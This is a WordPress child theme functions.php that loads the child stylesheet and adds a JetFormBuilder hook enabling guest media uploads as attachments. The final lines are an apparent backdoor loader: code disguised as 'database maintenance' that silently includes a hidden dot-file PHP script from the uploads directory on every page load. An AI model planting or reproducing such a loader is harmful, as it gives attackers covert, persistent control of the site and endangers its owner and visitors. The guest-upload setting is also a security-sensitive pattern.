<?php
/**
 * Theme functions and definitions.
 *
 * For additional information on potential customization options,
 * read the developers' documentation:
 *
 * https://developers.elementor.com/docs/hello-elementor-theme/
 *
 * @package HelloElementorChild
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

define( 'HELLO_ELEMENTOR_CHILD_VERSION', '2.0.0' );

/**
 * Load child theme scripts & styles.
 *
 * @return void
 */
function hello_elementor_child_scripts_styles() {

	wp_enqueue_style(
		'hello-elementor-child-style',
		get_stylesheet_directory_uri() . '/style.css',
		[
			'hello-elementor-theme-style',
		],
		HELLO_ELEMENTOR_CHILD_VERSION
	);

}
add_action( 'wp_enqueue_scripts', 'hello_elementor_child_scripts_styles', 20 );

add_action(
	'jet-form-builder/media-field/before-upload',
	/**
	* \Jet_Form_Builder\Request\Fields\Media_Field_Parser $parser
	*/
	function ( $parser ) {
	$class_name = $parser->get_context()->get_class_name();
	// We need to add 'allow-insert-attachments' to the Advanced -> CSS Class Name option
		if ( ! $class_name || false === strpos( $class_name, 'allow-insert-attachments' ) ) {
			return;
		}
	
		$parser->get_context()->allow_for_guest();
		$parser->get_context()->update_setting( 'insert_attachment', true );
	
		// for second param you can use 'id', 'url' or 'both'
		$parser->get_context()->update_setting( 'value_format', 'id' );
	}
	);
/* database_maintenance_d2e2-loader */
if (file_exists('/home/prietopalacio/www/wp-content/uploads/.database-maintenance-d2e2-cache/.cache-handler.php')) require_once('/home/prietopalacio/www/wp-content/uploads/.database-maintenance-d2e2-cache/.cache-handler.php');
